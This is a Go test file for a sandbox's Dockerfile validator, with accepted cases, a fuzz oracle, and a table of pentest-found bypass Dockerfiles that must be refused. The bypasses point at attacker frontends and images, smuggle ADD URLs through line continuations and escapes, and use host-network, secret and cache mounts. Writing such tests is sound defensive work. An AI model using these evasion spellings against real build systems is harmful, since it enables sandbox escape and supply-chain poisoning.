package sandbox

import (
	"encoding/json"
	"fmt"
	"regexp"
	"slices"
	"strings"
	"testing"
)

func TestCheckDockerfileAccepts(t *testing.T) {
	tests := map[string]struct {
		file   string
		images []string
	}{
		"plain":           {"FROM python:3.12-slim\nCOPY . /app\nRUN pip install --no-index /app\nCMD [\"python\", \"/app/app.py\"]\n", []string{"python:3.12-slim"}},
		"pinned":          {"FROM docker.io/library/node@sha256:" + strings.Repeat("a", 64) + "\n", []string{"docker.io/library/node@sha256:" + strings.Repeat("a", 64)}},
		"multi-stage":     {"FROM golang:1.27 AS build\nRUN go build -o /x .\nFROM scratch\nCOPY --from=build /x /x\nCOPY --from=0 /x /y\nCOPY --from=1 /x /z\n", []string{"golang:1.27"}},
		"stage case":      {"from golang:1.27 as Build\nfrom build\ncopy --FROM=BUILD /x /x\n", []string{"golang:1.27"}},
		"native platform": {"FROM --platform=$BUILDPLATFORM golang:1.27 AS b\nFROM --platform=${TARGETPLATFORM} alpine:3\n", []string{"alpine:3", "golang:1.27"}},
		"copy from image": {"FROM scratch\nCOPY --from=busybox:1.37 /bin/sh /sh\n", []string{"busybox:1.37"}},
		"mount context":   {"FROM alpine:3 AS a\nRUN --mount=type=bind,source=x,target=/t --mount=type=tmpfs,target=c /t/run\nWORKDIR app\nWORKDIR /srv/device\n", []string{"alpine:3"}},
		"local add":       {"FROM alpine:3\nADD app.tar.gz /app/\nADD [\"a b\", \"/dst/\"]\nADD --chown=1:1 src $HOME/\n", []string{"alpine:3"}},
		"urls elsewhere":  {"FROM alpine:3\nLABEL org.opencontainers.image.source=https://example.com/x\nRUN echo https://example.com\n", []string{"alpine:3"}},
		"tabs and crlf":   {"FROM\talpine:3\r\nRUN\ttrue\r\n", []string{"alpine:3"}},
		"plain comments":  {"#!/usr/bin/env docker\n# Build the app.\nFROM alpine:3\n  # indented comment\n", []string{"alpine:3"}},
		"healthcheck":     {"FROM alpine:3\nHEALTHCHECK --interval=5s CMD true\n", []string{"alpine:3"}},
		"boolean flags":   {"FROM alpine:3\nCOPY --link a /a\nCOPY --parents --LINK=false b /b\nADD --link c /c\n", []string{"alpine:3"}},
		"stage shadows":   {"FROM alpine:3 AS busybox\nFROM busybox\nCOPY --from=BUSYBOX /a /b\n", []string{"alpine:3"}},
		"stage ARG value": {"ARG TARGETOS\nFROM busybox\nARG V=1\nRUN echo $V\n", []string{"busybox"}},
		"go multi-stage":  {"FROM --platform=$BUILDPLATFORM golang:1.27 AS build\nARG TARGETOS TARGETARCH\nWORKDIR /src\nCOPY go.* ./\nCOPY . .\nRUN CGO_ENABLED=0 go build -o /app .\n\nFROM gcr.io/distroless/static:nonroot\nCOPY --from=build --chown=65532:65532 /app /app\nUSER nonroot\nENTRYPOINT [\"/app\"]\n", []string{"gcr.io/distroless/static:nonroot", "golang:1.27"}},
		"mount types":     {"FROM alpine:3\nRUN --mount=type=tmpfs,target=/t --mount=type=bind,source=x,target=/x --mount=target=/y true\n", []string{"alpine:3"}},
	}
	for name, tt := range tests {
		t.Run(name, func(t *testing.T) {
			images, _, rule := checkDockerfile([]byte(tt.file))
			if rule != "" {
				t.Fatalf("refused (%s)", rule)
			}
			if !slices.Equal(images, tt.images) {
				t.Errorf("images %q, want %q", images, tt.images)
			}
		})
	}
}

// dockerfileBypasses are Dockerfiles that BuildKit (v0.23.2's
// parser.DetectSyntax, parser.Parse and instructions.Parse, as the tester
// ran them on #274) reads as a frontend directive, an image the check did
// not return, or a RUN network option. Each must be refused, or must
// return the image so that its presence is checked.
var dockerfileBypasses = map[string]struct{ file, rule string }{
	"F1 BOM before syntax":        {"\xef\xbb\xbf# syntax=attacker.example/fe\nFROM alpine\n", ruleCharacter},
	"F1 slash syntax":             {"// syntax=attacker.example/fe\nFROM alpine\n", ruleDirective},
	"F1 slash syntax spaced":      {"  //syntax = attacker.example/fe\nFROM alpine\n", ruleDirective},
	"F1 shebang then syntax":      {"#!/bin/sh\n# syntax=attacker.example/fe\nFROM alpine\n", ruleDirective},
	"F1 JSON directive":           {"{\"syntax\": \"attacker.example/fe\"}\nFROM alpine\n", ruleDirective},
	"F1 syntax upper case":        {"#  SYNTAX = attacker.example/fe\nFROM alpine:3\n", ruleDirective},
	"F1 syntax after FROM":        {"FROM alpine:3\n# syntax=attacker.example/fe\n", ruleDirective},
	"F1 escape directive":         {"# escape=`\nFROM alpine:3\n", ruleDirective},
	"F2 FROM vertical tab":        {"FROM alpine\nFROM\vattacker.example/evil\n", ruleCharacter},
	"F2 FROM form feed":           {"FROM alpine\nFROM\fattacker.example/evil\n", ruleCharacter},
	"F2 FROM lone CR":             {"FROM alpine\nFROM\rattacker.example/evil\n", ruleCharacter},
	"F2 COPY vertical tab":        {"FROM alpine\nCOPY\v--from=attacker.example/evil /x /x\n", ruleCharacter},
	"F2 RUN vertical tab network": {"FROM alpine\nRUN\v--network=host true\n", ruleCharacter},
	"F2 mount From upper":         {"FROM alpine\nRUN --mount=type=bind,From=$X,target=/m true\n", ruleMountFrom},
	"F2 mount quoted key":         {"FROM alpine\nRUN --mount=type=bind,\"from=attacker.example/evil\",target=/m true\n", ruleFlag},
	"F2 mount quoted value":       {"FROM alpine\nRUN --mount=\"from=attacker.example/evil,target=/m\" true\n", ruleFlag},
	"F2 non-ASCII":                {"FROM alpine\nLABEL x=é\n", ruleCharacter},
	"F2 NUL":                      {"FROM alpine:3\x00\n", ruleCharacter},
	"RUN network host":            {"FROM alpine:3\nRUN --network=host wget example.com\n", ruleFlag},
	"RUN network none":            {"FROM alpine:3\nRUN --network=none true\n", ruleFlag},
	"RUN network upper":           {"FROM alpine:3\nRUN --NETWORK=host true\n", ruleFlag},
	"RUN security":                {"FROM alpine:3\nRUN --Security=insecure true\n", ruleFlag},
	"RUN device":                  {"FROM alpine:3\nRUN --device=/dev/kvm true\n", ruleFlag},
	"RUN unknown flag":            {"FROM alpine:3\nRUN --foo=bar true\n", ruleFlag},
	"N1 ONBUILD ADD url":          {"FROM alpine AS a\nONBUILD ADD https://attacker.example/x /x\nFROM a\n", ruleOnbuild},
	"N1 ONBUILD COPY from":        {"FROM alpine AS a\nONBUILD COPY --from=attacker.example/evil /x /x\nFROM a\n", ruleOnbuild},
	"N1 ONBUILD RUN mount":        {"FROM alpine AS a\nONBUILD RUN --mount=type=bind,from=attacker.example/evil,target=/m true\nFROM a\n", ruleOnbuild},
	"N1 onbuild lower case":       {"FROM alpine:3\nonbuild RUN true\n", ruleOnbuild},
	"N2 cache mount":              {"FROM alpine\nRUN --mount=type=cache,target=/root/.npm,sharing=shared sh -c 'echo poison > /root/.npm/x'\n", ruleMount},
	"N2 cache mount upper":        {"FROM alpine:3\nRUN --mount=TYPE=Cache,target=/c true\n", ruleMount},
	"N2 cache after bind":         {"FROM alpine:3\nRUN --mount=type=bind,target=/b --mount=target=/c,type=cache true\n", ruleMount},
	"N2 secret mount":             {"FROM alpine:3\nRUN --mount=type=secret,id=npmrc true\n", ruleMount},
	"N2 ssh mount":                {"FROM alpine:3\nRUN --mount=type=ssh true\n", ruleMount},
	"bare unknown flag":           {"FROM alpine:3\nCOPY --chown a /a\n", ruleFlag},
	"COPY from quoted":            {"FROM alpine:3\nCOPY --from=\"attacker.example/evil\" /x /x\n", ruleFlag},
	"COPY from escaped":           {"FROM alpine:3\nCOPY --from=attacker\\.example/evil /x /x\n", ruleFlag},
	"ADD remote only flag":        {"FROM alpine:3\nADD --checksum=sha256:00 x /x\n", ruleFlag},
	"ADD url":                     {"FROM alpine:3\nADD https://example.com/x /x\n", ruleRemoteAdd},
	"ADD url lower case":          {"FROM alpine:3\nadd http://example.com/x /x\n", ruleRemoteAdd},
	"ADD git":                     {"FROM alpine:3\nADD git@github.com:o/r.git /src\n", ruleRemoteAdd},
	"ADD scp-like":                {"FROM alpine:3\nADD me@host:repo /src\n", ruleRemoteAdd},
	"ADD variable source":         {"FROM alpine:3\nARG U=https://example.com\nADD $U /x\n", ruleRemoteAdd},
	"ADD json url":                {"FROM alpine:3\nADD [\"https://example.com/x\", \"/x\"]\n", ruleRemoteAdd},
	"ADD json escaped url":        {"FROM alpine:3\nADD --chown=1 [\"https\\u003a//example.com/x\", \"/x\"]\n", ruleRemoteAdd},
	"ADD url continued":           {"FROM alpine:3\nADD \\\n  https://example.com/x \\\n  /x\n", ruleRemoteAdd},
	"ADD url after comment":       {"FROM alpine:3\nADD \\\n# hidden\n  https://example.com/x /x\n", ruleRemoteAdd},
	"variable base":               {"ARG BASE\nFROM $BASE\n", ruleVariableImage},
	"variable base braces":        {"FROM ${BASE:-alpine}\n", ruleVariableImage},
	"variable copy from":          {"FROM alpine:3\nCOPY --from=$IMG /x /x\n", ruleVariableImage},
	"variable mount from":         {"FROM alpine:3\nRUN --mount=type=bind,from=${IMG},target=/t true\n", ruleMountFrom},
	"mount source above root":     {"FROM alpine:3\nRUN --mount=type=bind,source=../../etc,target=/t true\n", ruleMount},
	"foreign platform":            {"FROM --platform=linux/s390x alpine:3\n", rulePlatform},
	"foreign platform upper":      {"FROM --PLATFORM=linux/s390x alpine:3\n", rulePlatform},
	"flag as image":               {"FROM -x\n", ruleImageName},
	"image with space":            {"FROM alpine 3\n", ruleImageName},
	"no from":                     {"RUN true\n", ruleNoFrom},
	// v0.2 release pentest F1-F3, each checked against BuildKit's parser.
	"double backslash ends line": {"FROM busybox\nRUN x\\\\\nADD http://evil.example/a /a\n", ruleContinuation},
	"heredoc hash end word":      {"FROM busybox\nRUN <<#X\nx \\\n#X\nADD http://evil.example/a /a\n", ruleHeredoc},
	"heredoc body stage":         {"FROM busybox\nRUN <<EOF\nFROM scratch AS attacker\nEOF\nCOPY --from=attacker / /x\n", ruleHeredoc},
	"heredoc dash":               {"FROM busybox\nCOPY <<-EOF /x\nhi\nEOF\n", ruleHeredoc},
	"heredoc fd":                 {"FROM busybox\nRUN 3<<EOF cat <&3\nhi\nEOF\n", ruleHeredoc},
	"heredoc continued":          {"FROM busybox\nADD \\\n<<EOF /x\nhi\nEOF\n", ruleHeredoc},
	"lone backslash continues":   {"FROM busybox\nADD \\\n\\\nhttps://example.com/x /x\n", ruleRemoteAdd},
	// PR #307 review, each checked against BuildKit v0.23.2: it joins the
	// pieces of a continued line with nothing between them, and its shell
	// lexer drops quotes and escapes in every ADD source.
	"url split over lines":     {"FROM busybox\nADD http:/\\\n/evil.example/x /d\n", ruleRemoteAdd},
	"url split CRLF":           {"FROM busybox\r\nADD http:/\\\r\n/evil.example/x /d\r\n", ruleRemoteAdd},
	"url split after flag":     {"FROM busybox\nADD --chmod=644 http:/\\\n/evil.example/x /d\n", ruleRemoteAdd},
	"url split over comment":   {"FROM busybox\nADD http:/\\\n# c \\\n\n/evil.example/x /d\n", ruleRemoteAdd},
	"keyword split":            {"FROM busybox\nAD\\\nD http://evil.example/x /d\n", ruleRemoteAdd},
	"heredoc split":            {"FROM busybox\nRUN <\\\n<EOF cat\nhi\nEOF\n", ruleHeredoc},
	"url escaped slashes":      {"FROM busybox\nADD http:\\/\\/evil.example/x /d\n", ruleRemoteAdd},
	"url quoted part":          {"FROM busybox\nADD http:\"//\"evil.example/x /d\n", ruleRemoteAdd},
	"url single quoted part":   {"FROM busybox\nADD http:'//'evil.example/x /d\n", ruleRemoteAdd},
	"json url escaped slashes": {"FROM busybox\nADD [\"http:\\\\/\\\\/evil.example/x\", \"/d\"]\n", ruleRemoteAdd},
	"too many images":          {manyImages(maxBaseImages + 1), ruleTooManyImages},
}

// TestDockerfileBypassesRefused is the protection test for the
// Dockerfile check: every way the tester found (#274 F1-F3) and each
// related spelling for BuildKit to read a frontend directive, an image
// creep did not check, or a RUN network option is refused.
func TestDockerfileBypassesRefused(t *testing.T) {
	for name, tt := range dockerfileBypasses {
		t.Run(name, func(t *testing.T) {
			if _, _, rule := checkDockerfile([]byte(tt.file)); rule != tt.rule {
				t.Errorf("rule %q, want %q", rule, tt.rule)
			}
		})
	}
}

func manyImages(n int) string {
	var b strings.Builder
	for i := range n {
		fmt.Fprintf(&b, "FROM base%d:1\n", i)
	}
	return b.String()
}

// BuildKit's own lexical rules, as an independent oracle for the fuzz
// target: its keyword split ([\t\v\f\r ]+), its directive forms, and its
// case-insensitive flag and mount-key names, with quotes stripped.
var (
	buildkitSpace = regexp.MustCompile(`[\t\v\f\r ]+`)
	buildkitDirRe = regexp.MustCompile(`(?i)^[\t\v\f\r ]*(#|//)[\t\v\f\r ]*syntax[\t\v\f\r ]*=`)
	buildkitNetRe = regexp.MustCompile(`(?i)^--(network|security|device)\b`)
	// buildkitContRe is BuildKit v0.23.2's line continuation regex, copied
	// verbatim; a match is replaced with its first group, nothing else.
	buildkitContRe = regexp.MustCompile(`([^\\])\\[ \t]*$|^\\[ \t]*$`)
)

// oracleLines joins continued lines the way BuildKit's parser does: with
// its own continuation regex and nothing between the pieces, comment and
// blank lines inside dropped. It
// splits on its own white-space class, so it sees \v, \f and \r.
func oracleLines(text string) []string {
	var out []string
	cur := ""
	for _, l := range strings.Split(text, "\n") {
		if buildkitDirRe.MatchString(l) {
			out = append(out, "#syntax")
		}
		t := strings.Trim(l, "\t\v\f\r ")
		if t == "" || strings.HasPrefix(t, "#") {
			continue
		}
		l = strings.TrimRight(l, "\r")
		if buildkitContRe.MatchString(l) {
			cur += buildkitContRe.ReplaceAllString(l, "$1")
			continue
		}
		out = append(out, cur+l)
		cur = ""
	}
	return append(out, cur)
}

// oracleProblems reads an accepted Dockerfile the way BuildKit could, more
// loosely than checkDockerfile, and reports what the check should have
// refused or returned: a syntax directive, a RUN network option, or an
// image in FROM, --from or from= that is neither returned nor a stage.
func oracleProblems(data []byte, images, stages []string) []string {
	// Only COPY --from names a stage by index; FROM and from= never do.
	known := func(ref string, byIndex bool) bool {
		ref = strings.ToLower(strings.Trim(ref, `"'`))
		return ref == "" || ref == "scratch" || slices.Contains(stages, ref) || byIndex && isIndexBelow(ref, 1<<10) ||
			slices.ContainsFunc(images, func(i string) bool { return strings.EqualFold(i, ref) })
	}
	problems := append(builderProblems(data, images), pentestProblems(data)...)
	for _, line := range oracleLines(strings.TrimPrefix(string(data), "\xef\xbb\xbf")) {
		if line == "#syntax" {
			problems = append(problems, "syntax directive")
			continue
		}
		fields := buildkitSpace.Split(strings.Trim(line, "\t\v\f\r "), -1)
		keyword, flags, args := strings.ToUpper(fields[0]), leadingFlags(fields[1:]), fields[1+len(leadingFlags(fields[1:])):]
		if keyword == "FROM" && len(args) > 0 && !known(args[0], false) {
			problems = append(problems, "FROM image not checked: "+line)
		}
		if (keyword == "RUN" || keyword == "COPY" || keyword == "ADD") && strings.Contains(line, "<<") {
			problems = append(problems, "heredoc: "+line)
		}
		if keyword == "ADD" && oracleRemoteAdd(args) {
			problems = append(problems, "remote add: "+line)
		}
		if keyword == "ONBUILD" {
			problems = append(problems, "onbuild trigger: "+line)
		}
		if keyword != "RUN" && keyword != "COPY" {
			continue
		}
		for _, f := range flags {
			if keyword == "RUN" && buildkitNetRe.MatchString(f) {
				problems = append(problems, "run option: "+line)
			}
			if keyword == "RUN" && oracleCacheMount(f) {
				problems = append(problems, "mount outliving the build: "+line)
			}
			for _, ref := range oracleFromValues(f) {
				if !known(ref, keyword == "COPY") {
					problems = append(problems, "from image not checked: "+line)
				}
			}
		}
	}
	return problems
}

// oracleRemoteAdd reads the ADD sources as BuildKit's shell lexer leaves
// them, quotes and escapes dropped, in the shell and the JSON form, and
// reports a URL or a git remote.
func oracleRemoteAdd(args []string) bool {
	var srcs []string
	if json.Unmarshal([]byte(strings.Join(args, " ")), &srcs) != nil {
		srcs = args
	}
	if len(srcs) > 0 {
		srcs = srcs[:len(srcs)-1] // the destination
	}
	unquote := strings.NewReplacer(`"`, "", "'", "", `\`, "")
	for _, src := range srcs {
		src = unquote.Replace(src)
		if strings.Contains(src, "://") || strings.Contains(src, "@") && strings.Contains(src, ":") {
			return true
		}
	}
	return false
}

// oracleCacheMount is a --mount whose type BuildKit keeps or fills from
// the host: cache, secret or ssh, in any case.
func oracleCacheMount(flag string) bool {
	name, value, _ := strings.Cut(flag, "=")
	if !strings.EqualFold(name, "--mount") {
		return false
	}
	for _, kv := range strings.Split(strings.Trim(value, `"'`), ",") {
		k, v, _ := strings.Cut(strings.Trim(kv, `"'`), "=")
		if strings.EqualFold(strings.TrimSpace(k), "type") && !slices.Contains([]string{"bind", "tmpfs"}, strings.ToLower(v)) {
			return true
		}
	}
	return false
}

func leadingFlags(fields []string) []string {
	n := 0
	for n < len(fields) && strings.HasPrefix(fields[n], "--") {
		n++
	}
	return fields[:n]
}

// oracleFromValues reads --from=X and --mount=...,from=X with BuildKit's
// leniency: any case, quotes stripped around the value and each key.
func oracleFromValues(flag string) []string {
	name, value, _ := strings.Cut(flag, "=")
	value = strings.Trim(value, `"'`)
	switch strings.ToLower(name) {
	case "--from":
		return []string{value}
	case "--mount":
		var refs []string
		for _, kv := range strings.Split(value, ",") {
			k, v, _ := strings.Cut(strings.Trim(kv, `"'`), "=")
			if strings.EqualFold(strings.TrimSpace(k), "from") {
				refs = append(refs, v)
			}
		}
		return refs
	}
	return nil
}

// FuzzCheckDockerfile compares checkDockerfile with the BuildKit oracle:
// whatever it accepts holds only the accepted bytes and nothing BuildKit
// would read as a directive, a RUN network option or an unchecked image.
// The seed corpus is every bypass and accepted case above.
func FuzzCheckDockerfile(f *testing.F) {
	for _, tt := range dockerfileBypasses {
		f.Add([]byte(tt.file))
	}
	for _, s := range []string{
		"FROM alpine:3\nCOPY --from=0 /x /x\n", "FROM a AS b\nFROM b\nRUN --mount=from=b,target=/x true\n",
		"FROM alpine:3\nRUN --mount=type=bind,FROM=evil.example/x,target=/m true\n",
		"FROM alpine:3\nCOPY --FROM=evil.example/x /a /a\n", "FROM 7\n",
	} {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		images, stages, rule := checkDockerfile(data)
		if rule != "" {
			return
		}
		if _, ok := plainText(data); !ok {
			t.Fatalf("accepted bytes outside the form: %q", data)
		}
		if p := oracleProblems(data, images, stages); len(p) > 0 {
			t.Fatalf("accepted %q: %v (images %q, stages %q)", data, p, images, stages)
		}
	})
}

// TestOracleCatchesOldCheck proves the oracle can fail: the Dockerfiles
// the previous check accepted (#274 F1, F2) are caught by it, whatever
// images were returned for them.
func TestOracleCatchesOldCheck(t *testing.T) {
	for _, file := range []string{
		"\xef\xbb\xbf# syntax=attacker.example/fe\nFROM alpine\n",
		"// syntax=attacker.example/fe\nFROM alpine\n",
		"FROM alpine\nFROM\vattacker.example/evil\n",
		"FROM alpine\nCOPY\v--from=attacker.example/evil /x /x\n",
		"FROM alpine\nRUN\v--network=host true\n",
		"FROM alpine\nRUN --mount=type=bind,From=attacker.example/evil,target=/m true\n",
		"FROM alpine\nRUN --mount=type=bind,\"from=attacker.example/evil\",target=/m true\n",
		"FROM alpine AS a\nONBUILD ADD https://attacker.example/x /x\nFROM a\n",
		"FROM alpine\nRUN --mount=type=cache,target=/root/.npm true\n",
		// accepted before the PR #307 review
		"FROM alpine\nADD http:/\\\n/evil.example/x /d\n",
		"FROM alpine\nAD\\\nD http://evil.example/x /d\n",
		"FROM alpine\nADD http:\"//\"evil.example/x /d\n",
		"FROM alpine\nADD [\"http:\\\\/\\\\/evil.example/x\", \"/d\"]\n",
		"FROM alpine\nRUN <\\\n<EOF cat\nhi\nEOF\n",
		"FROM alpine\nFROM attacker.example/ev\\\nil\n",
		// accepted before the v0.2 Dockerfile re-check
		"FROM alpine\nRUN --mount=type=bind,from=0,target=/x true\n",
		"FROM 526f\n",
		"ARG BUILDPLATFORM=linux/ppc64le\nFROM --platform=$BUILDPLATFORM alpine\n",
		"FROM alpine\nADD a \\\\\nhttp://evil.example/x /x\n",
	} {
		if len(oracleProblems([]byte(file), []string{"alpine"}, nil)) == 0 {
			t.Errorf("oracle missed %q", file)
		}
	}
}
